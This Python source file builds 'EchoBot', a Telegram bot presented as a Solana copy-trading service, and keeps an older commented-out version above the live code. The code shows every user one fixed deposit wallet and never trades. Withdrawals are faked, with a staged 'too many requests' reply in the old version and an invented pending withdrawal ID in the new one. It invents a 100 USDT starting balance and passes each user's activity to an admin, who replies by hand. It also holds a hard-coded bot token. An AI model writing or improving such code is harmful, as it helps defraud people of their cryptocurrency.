# from telegram import Update, ReplyKeyboardRemove
# from telegram.ext import (
#     ApplicationBuilder, CommandHandler, MessageHandler, filters,
#     ContextTypes, ConversationHandler
# )
# from datetime import datetime
# import asyncio


# # Bot token and admin chat ID
# BOT_TOKEN = "8799690308:AAHR5L_uCZscG_pBEIvnTwGxanJpXt7Iqj4"  # Replace with your actual bot token
# ADMIN_CHAT_ID = 8744932799  # Replace this with your admin chat  ID
# WALLET_ADDRESS = "CVh6jT8V32Yh5SMtTsuA4riYKZDeeVs12SvRJQPZxa6Y"

# # Conversation states for withdrawal
# WALLET_ADDRESS, AMOUNT = range(2)

# # In-memory user balances and jobs
# user_balances = {}
# user_jobs = {}

# INACTIVITY_TIMEOUT = 120  # 2 minutes timeout

# # Start command
# async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     await update.message.reply_text(
#         "Solana's fastest bot to copy trade any coin (SPL token). Deposit SOL to start trading.\n"
#         "How can I assist you? Use the buttons below to interact."
#     )
#     #await reset_inactivity_timer(context, update.effective_user.id)

# # Reset inactivity timer
# async def reset_inactivity_timer(context: ContextTypes.DEFAULT_TYPE, user_id: int):
#     if context.job_queue is None:
#         print("Error: JobQueue not initialized.")
#         return

#     # Cancel any existing job
#     if user_id in user_jobs:
#         user_jobs[user_id].schedule_removal()

#     # Schedule new inactivity job
#     job = context.job_queue.run_once(send_inactivity_message, INACTIVITY_TIMEOUT, chat_id=user_id)
#     user_jobs[user_id] = job

# # Send inactivity message
# async def send_inactivity_message(context: ContextTypes.DEFAULT_TYPE):
#     await context.bot.send_message(
#         chat_id=context.job.chat_id,
#         text="You've been inactive for 2 minutes. Type /start to continue."
#     )

# # Wallet command
# async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     wallet_address = "CVh6jT8V32Yh5SMtTsuA4riYKZDeeVs12SvRJQPZxa6Y"
#     await update.message.reply_text(
#         f"Your wallet address:  {wallet_address}\n\n"
#         "Copy the address and send SOL to deposit."
#     )
#     #await reset_inactivity_timer(context, update.effective_user.id)

# # Balance command
# async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     user_id = str(update.effective_user.id)
#     username = update.effective_user.username or "Unknown"

#     # Notify the user that data is being fetched
#     await update.message.reply_text("Fetching Balance, Please Wait...")

#     # Send balance request notification to the admin
#     balance = user_balances.get(user_id, 100)  # Default balance = 100 USDT for new users
#     await context.bot.send_message(
#         chat_id=ADMIN_CHAT_ID,
#         text=f"User @{username} (ID: {user_id}) has requested their balance. Current balance: {balance} USDT."
#     )
#     #await reset_inactivity_timer(context, update.effective_user.id)

# # Admin reply handler
# async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     if update.effective_chat.id != ADMIN_CHAT_ID:
#         return  # Ignore messages not from the admin

#     command_parts = update.message.text.split(maxsplit=2)
#     if len(command_parts) < 3:
#         await update.message.reply_text("Usage: /reply <user_id> <your message>")
#         return

#     user_id_raw = command_parts[1]
#     reply_message = command_parts[2]

#     if not user_id_raw.isdigit():
#         await update.message.reply_text("Error: The user ID must be a valid number.")
#         return

#     user_id = int(user_id_raw)
#     try:
#         await context.bot.send_message(chat_id=user_id, text=f"{reply_message}")
#         await update.message.reply_text(f"Message successfully sent to user {user_id}.")
#     except Exception as e:
#         await update.message.reply_text(f"Failed to send message: {e}")

# # Withdraw command - Step 1: Ask for wallet address
# async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     await update.message.reply_text(
#         "To withdraw, please provide your wallet address.",
#         reply_markup=ReplyKeyboardRemove()
#     )
#     #await reset_inactivity_timer(context, update.effective_user.id)
#     return WALLET_ADDRESS

# # Withdraw Step 2: Get wallet address and ask for amount
# async def wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     context.user_data["wallet_address"] = update.message.text.strip()
#     await update.message.reply_text("Got it! Now, please enter the amount you'd like to withdraw (in SOL):")
#     await reset_inactivity_timer(context, update.effective_user.id)
#     return AMOUNT

# # Withdraw Step 3: Validate amount and process withdrawal
# async def amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     user_id = str(update.effective_user.id)
#     wallet = context.user_data.get("wallet_address")
#     amount_text = update.message.text.strip()

#     # Validate the amount
#     try:
#         amount = float(amount_text)
#         if amount <= 0:
#             await update.message.reply_text("Invalid amount. Please enter a positive number (e.g., 0.5 SOL).")
#             return AMOUNT
#     except ValueError:
#         await update.message.reply_text("Invalid amount. Please enter a valid number (e.g., 0.5 SOL).")
#         return AMOUNT

#     # Notify user of the received withdrawal request
#     await update.message.reply_text(
#         f"Withdrawal request received:\nWallet: {wallet}\nAmount: {amount_text} SOL.\nProcessing..."
#     )

#     # Simulate delay for processing
#     await asyncio.sleep(3)

#     # Notify user about server overload
#     await update.message.reply_text(
#         "Too many requests at the same time. Please wait a while and try again."
#     )

#     #await reset_inactivity_timer(context, update.effective_user.id)
#     return ConversationHandler.END

# # Cancel withdrawal
# async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     await update.message.reply_text("Withdrawal process canceled.", reply_markup=ReplyKeyboardRemove())
#     await reset_inactivity_timer(context, update.effective_user.id)
#     return ConversationHandler.END

# # Copy trade command
# async def copytrade(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     copy_wallet = "CVh6jT8V32Yh5SMtTsuA4riYKZDeeVs12SvRJQPZxa6Y"
#     await update.message.reply_text(
#         f"To get started, deposit SOL to your wallet address below:\n\n{copy_wallet}"
#     )
#     await reset_inactivity_timer(context, update.effective_user.id)

# # Main function
# def main():
#     app = ApplicationBuilder().token(BOT_TOKEN).build()

#     # Conversation handler for withdrawal
#     withdraw_handler = ConversationHandler(
#         entry_points=[CommandHandler("withdraw", withdraw)],
#         states={
#             WALLET_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_address)],
#             AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, amount)],
#         },
#         fallbacks=[CommandHandler("cancel", cancel)],
#     )

#     # Add handlers
#     app.add_handler(CommandHandler("start", start))
#     app.add_handler(CommandHandler("wallet", wallet))
#     app.add_handler(CommandHandler("balance", balance))
#     app.add_handler(withdraw_handler)
#     app.add_handler(CommandHandler("copytrade", copytrade))
#     app.add_handler(MessageHandler(filters.TEXT & filters.Chat(ADMIN_CHAT_ID), admin_reply))

#     print("Bot is running...")
#     app.run_polling()

# if __name__ == "__main__":
#     main()


# *@ZEK5dc

from telegram import Update, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, filters,
    ContextTypes, ConversationHandler
)
from datetime import datetime
import asyncio
import uuid


# Bot token and admin chat ID
BOT_TOKEN = "8799690308:AAHR5L_uCZscG_pBEIvnTwGxanJpXt7Iqj4"  # Replace with your actual bot token
ADMIN_CHAT_ID = 8744932799  # Replace this with your admin chat  ID
WALLET_ADDRESS = "CVh6jT8V32Yh5SMtTsuA4riYKZDeeVs12SvRJQPZxa6Y"
COPYTRADE_ADDRESS = 10

# Conversation states for withdrawal
# WALLET_ADDRESS, AMOUNT = range(2)
WITHDRAW_WALLET, WITHDRAW_AMOUNT, DEPOSIT_AMOUNT, DEPOSIT_ADDRESS = range(4)

# In-memory user balances and jobs
user_balances = {}
user_jobs = {}

INACTIVITY_TIMEOUT = 120  # 2 minutes timeout

# Start command
# async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     await update.message.reply_text(
#         "Solana's fastest bot to copy trade any coin (SPL token). Deposit SOL to start trading.\n"
#         "How can I assist you? Use the buttons below to interact."
#     )
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = update.effective_user.username or update.effective_user.first_name
    await notify_admin(context, update, "/start")

    await update.message.reply_text(
f"""🚀 Welcome to EchoBot 🚀

Hello @{username}!

Solana's fastest bot to copy trade any SPL token.

Deposit SOL to your wallet address to begin trading.

💰 Deposit Address:
{WALLET_ADDRESS}

━━━━━━━━━━━━━━━━━━━━━━

📋 Available Commands

👛 /wallet
View your deposit wallet address.

💵 /balance
Check your account balance.

📤 /withdraw
Withdraw your available balance.

📈 /copytrade
Start copy trading.

❌ /cancel
Cancel the current operation.

━━━━━━━━━━━━━━━━━━━━━━

Type any command above to get started.
""")
    #await reset_inactivity_timer(context, update.effective_user.id)

# Reset inactivity timer
async def reset_inactivity_timer(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    if context.job_queue is None:
        print("Error: JobQueue not initialized.")
        return

    # Cancel any existing job
    if user_id in user_jobs:
        user_jobs[user_id].schedule_removal()

    # Schedule new inactivity job
    job = context.job_queue.run_once(send_inactivity_message, INACTIVITY_TIMEOUT, chat_id=user_id)
    user_jobs[user_id] = job

# Send inactivity message
async def send_inactivity_message(context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_message(
        chat_id=context.job.chat_id,
        text="You've been inactive for 2 minutes. Type /start to continue."
    )

# Wallet command
async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    wallet_address = "CVh6jT8V32Yh5SMtTsuA4riYKZDeeVs12SvRJQPZxa6Y"
    await update.message.reply_text(
        f"Your wallet address:  {wallet_address}\n\n"
        "Copy the address and send SOL to deposit."
    )
    #await reset_inactivity_timer(context, update.effective_user.id)

# Balance command
async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    username = update.effective_user.username or "Unknown"

    # Notify the user that data is being fetched
    await update.message.reply_text("Fetching Balance, Please Wait...")

    # Send balance request notification to the admin
    balance = user_balances.get(user_id, 100)  # Default balance = 100 USDT for new users
    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=f"User @{username} (ID: {user_id}) has requested their balance. Current balance: {balance} USDT."
    )
    #await reset_inactivity_timer(context, update.effective_user.id)

# Admin reply handler
async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        return  # Ignore messages not from the admin

    command_parts = update.message.text.split(maxsplit=2)
    if len(command_parts) < 3:
        await update.message.reply_text("Usage: /reply <user_id> <your message>")
        return

    user_id_raw = command_parts[1]
    reply_message = command_parts[2]

    if not user_id_raw.isdigit():
        await update.message.reply_text("Error: The user ID must be a valid number.")
        return

    user_id = int(user_id_raw)
    try:
        await context.bot.send_message(chat_id=user_id, text=f"{reply_message}")
        await update.message.reply_text(f"Message successfully sent to user {user_id}.")
    except Exception as e:
        await update.message.reply_text(f"Failed to send message: {e}")

async def notify_admin(
    context: ContextTypes.DEFAULT_TYPE,
    update: Update,
    command: str
):
    user = update.effective_user

    username = f"@{user.username}" if user.username else user.first_name

    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=(
            "📢 USER ACTIVITY\n\n"
            f"👤 User: {username}\n"
            f"🆔 User ID: {user.id}\n"
            f"⚡ Command: {command}"
        )
    )

# Withdraw command - Step 1: Ask for wallet address
# async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     await update.message.reply_text(
#         "To withdraw, please provide your wallet address.",
#         reply_markup=ReplyKeyboardRemove()
#     )
#     #await reset_inactivity_timer(context, update.effective_user.id)
#     return WITHDRAW_WALLET
async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):

    await notify_admin(context, update, "/withdraw")

    await update.message.reply_text(
        "🔄 Withdraw SOL\n\n"
        "💰 Please enter the amount to withdraw.\n\n"
        "💡 Tip: Use /cancel to cancel this operation."
    )

    return WITHDRAW_AMOUNT

# Withdraw Step 2: Get wallet address and ask for amount
# async def wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     context.user_data["wallet_address"] = update.message.text.strip()
#     await update.message.reply_text("Got it! Now, please enter the amount you'd like to withdraw (in SOL):")
#     await reset_inactivity_timer(context, update.effective_user.id)
#     return WITHDRAW_AMOUNT

# Withdraw Step 3: Validate amount and process withdrawal
# async def amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     user_id = str(update.effective_user.id)
#     wallet = context.user_data.get("wallet_address")
#     amount_text = update.message.text.strip()

#     # Validate the amount
#     try:
#         amount = float(amount_text)
#         if amount <= 0:
#             await update.message.reply_text("Invalid amount. Please enter a positive number (e.g., 0.5 SOL).")
#             return WITHDRAW_AMOUNT
#     except ValueError:
#         await update.message.reply_text("Invalid amount. Please enter a valid number (e.g., 0.5 SOL).")
#         return WITHDRAW_AMOUNT

#     # Notify user of the received withdrawal request
#     await update.message.reply_text(
#         f"Withdrawal request received:\nWallet: {wallet}\nAmount: {amount_text} SOL.\nProcessing..."
#     )

#     # Simulate delay for processing
#     await asyncio.sleep(3)

#     # Notify user about server overload
#     await update.message.reply_text(
#         "Too many requests at the same time. Please wait a while and try again."
#     )

#     #await reset_inactivity_timer(context, update.effective_user.id)
#     return ConversationHandler.END
async def withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):

    amount = update.message.text.strip()

    try:
        amount = float(amount)

        if amount <= 0:
            raise ValueError

    except ValueError:
        await update.message.reply_text(
            "Please enter a valid amount."
        )

        return WITHDRAW_AMOUNT

    context.user_data["withdraw_amount"] = amount

    await update.message.reply_text(
        "🏦 Please enter the address to withdraw to.\n\n"
        "💡 Tip: Use /cancel to cancel this operation."
    )

    return WITHDRAW_WALLET


async def withdraw_address(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user = update.effective_user

    address = update.message.text.strip()

    amount = context.user_data["withdraw_amount"]

    withdrawal_id = str(uuid.uuid4())

    await update.message.reply_text(
        f"""✅ Withdrawal request submitted!

📋 Withdrawal ID:
`{withdrawal_id}`

💰 Amount:
`{amount}` SOL

🏦 Address:
`{address}`

⏳ Status: Pending confirmation
""",
        parse_mode="Markdown"
    )

    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=f"""📤 NEW WITHDRAWAL REQUEST

👤 User: @{user.username or "No Username"}
🆔 User ID: {user.id}

💰 Amount:
{amount} SOL

🏦 Withdrawal Address:
{address}

📋 Withdrawal ID:
{withdrawal_id}

Reply using:

/reply {user.id} <message>
"""
    )

    context.user_data.clear()

    return ConversationHandler.END


# Cancel withdrawal
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Withdrawal process canceled.", reply_markup=ReplyKeyboardRemove())
    await reset_inactivity_timer(context, update.effective_user.id)
    return ConversationHandler.END


async def deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await notify_admin(context, update, "/deposit")
    await update.message.reply_text(
        f"""💰 Your Deposit Address

• Solana:
{WALLET_ADDRESS}

💵 Please enter the amount you want to deposit.

💡 Tip: Use /cancel to cancel this operation.
"""
    )

    return DEPOSIT_AMOUNT

async def deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    amount_text = update.message.text.strip()

    try:
        amount = float(amount_text)

        if amount <= 0:
            raise ValueError

    except ValueError:
        await update.message.reply_text(
            "Please enter a valid deposit amount."
        )
        return DEPOSIT_AMOUNT

    context.user_data["deposit_amount"] = amount

    await update.message.reply_text(
        """🏦 Please enter the address you deposited to.

💡 Tip: Use /cancel to cancel this operation."""
    )

    return DEPOSIT_ADDRESS


async def deposit_address(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user = update.effective_user

    address = update.message.text.strip()
    amount = context.user_data["deposit_amount"]

    deposit_id = str(uuid.uuid4())

    await update.message.reply_text(
                f"""✅ Deposit request submitted successfully!

                📋 Deposit ID: `{deposit_id}`

                💰 Amount: {amount} SOL

                🏦 Address:
                `{address}`

                ⏳ Status: Pending confirmation
                """,
                parse_mode="Markdown"
        )

    await context.bot.send_message(chat_id=ADMIN_CHAT_ID,text=f"""📥 NEW DEPOSIT REQUEST \n👤 User: @{user.username}
            🆔 User ID: {user.id}

            💰 Amount: {amount} SOL

            🏦 Address:
            {address}

            📋 Deposit ID:
            {deposit_id}

            Reply using:

            /reply {user.id} <message>
            """
        )

    return ConversationHandler.END


# Copy trade command
# async def copytrade(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     copy_wallet = "CVh6jT8V32Yh5SMtTsuA4riYKZDeeVs12SvRJQPZxa6Y"
#     await update.message.reply_text(
#         f"To get started, deposit SOL to your wallet address below:\n\n{copy_wallet}"
#     )
#     await reset_inactivity_timer(context, update.effective_user.id)

async def copytrade(update: Update, context: ContextTypes.DEFAULT_TYPE):

    await notify_admin(context, update, "/copytrade")

    await update.message.reply_text(
        "🔄 Enter the address to copytrade:"
    )

    return COPYTRADE_ADDRESS


async def copytrade_address(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user = update.effective_user
    wallet = update.message.text.strip()

    await update.message.reply_text(
        "⏳ Processing copytrading request..."
    )

    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=f"""🚀 NEW COPYTRADE REQUEST

👤 User: @{user.username or "No Username"}
🆔 User ID: {user.id}

📍 Copytrade Wallet:
{wallet}

Reply using:

/reply {user.id} <message>
"""
    )

    await asyncio.sleep(3)

    await update.message.reply_text(
        f"🚀 Copytrading address `{wallet}` in progress!",
        parse_mode="Markdown"
    )

    return ConversationHandler.END

# Main function
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Conversation handler for withdrawal
    deposit_handler = ConversationHandler(
        entry_points=[CommandHandler("deposit", deposit)],
        states={
            DEPOSIT_AMOUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_amount)
            ],
            DEPOSIT_ADDRESS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_address)
            ],
        },
        fallbacks=[
            CommandHandler("cancel", cancel)
        ],
    )
    # withdraw_handler = ConversationHandler(
    #     entry_points=[CommandHandler("withdraw", withdraw)],
    #     states={
    #         WITHDRAW_WALLET: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_address)],
    #         WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, amount)],
    #     },
    #     fallbacks=[CommandHandler("cancel", cancel)],
    # )

    withdraw_handler = ConversationHandler(
        entry_points=[
            CommandHandler("withdraw", withdraw)
        ],
        states={
            WITHDRAW_AMOUNT: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    withdraw_amount
                )
            ],

            WITHDRAW_WALLET: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    withdraw_address
                )
            ],
        },
        fallbacks=[
            CommandHandler("cancel", cancel)
        ],
    )


    copytrade_handler = ConversationHandler(
        entry_points=[
            CommandHandler("copytrade", copytrade)
        ],
        states={
            COPYTRADE_ADDRESS: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    copytrade_address
                )
            ],
        },
        fallbacks=[
            CommandHandler("cancel", cancel)
        ],
    )

    app.add_handler(copytrade_handler)

    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("wallet", wallet))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(withdraw_handler)
    app.add_handler(deposit_handler)
    # app.add_handler(CommandHandler("copytrade", copytrade))
    app.add_handler(MessageHandler(filters.TEXT & filters.Chat(ADMIN_CHAT_ID), admin_reply))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()